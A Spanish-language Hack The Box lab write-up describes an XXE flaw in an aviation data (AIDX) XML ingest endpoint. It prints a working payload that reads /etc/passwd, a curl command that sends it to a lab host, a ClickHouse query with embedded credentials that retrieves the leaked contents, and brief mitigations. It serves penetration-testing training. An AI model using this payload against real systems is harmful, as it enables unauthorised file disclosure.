# XXE via AIDX Ingest (Hack The Box Stream)

## Descripción
El servicio de ingestión AIDX (Aeronautical Data Exchange) acepta XML en el endpoint `/feeds/aidx`. Aunque el servicio solo hace *string matching* de cuatro etiquetas obligatorias, el parser downstream (lxml con `resolve_entities=True`) resuelve entidades `file://` y el resultado se almacena en ClickHouse.

## Endpoint vulnerable
`POST /feeds/aidx`

## Payload XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator>&xxe;</Originator>
  <FlightLeg>
    <LegIdentifier>TEST01</LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

## Flujo de explotación

1. Enviar XML con entidad XXE al endpoint `/feeds/aidx`
2. El servicio publica el mensaje en Kafka topic `aidx.flightleg.raw.v1`
3. El parser lxml resuelve la entidad y guarda el resultado en `partner_feed.flightleg_json`
4. Consultar ClickHouse para recuperar el contenido del archivo

```bash
# Enviar payload XXE
curl -s -X POST http://10.129.127.23:8081/feeds/aidx \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml

# Consultar resultado en ClickHouse
curl -s -u "svc_events:Yl4aCgh4y2PnU" \
  "http://db.htb-airport.htb/?query=SELECT+flight_number+FROM+partner_feed.flightleg_json+WHERE+flight_number='TEST01'"
```

## Mitigación
- Deshabilitar `resolve_entities` en parsers XML
- Validar y sanitizar entrada XML
- Usar parsers seguros (defusedxml en Python)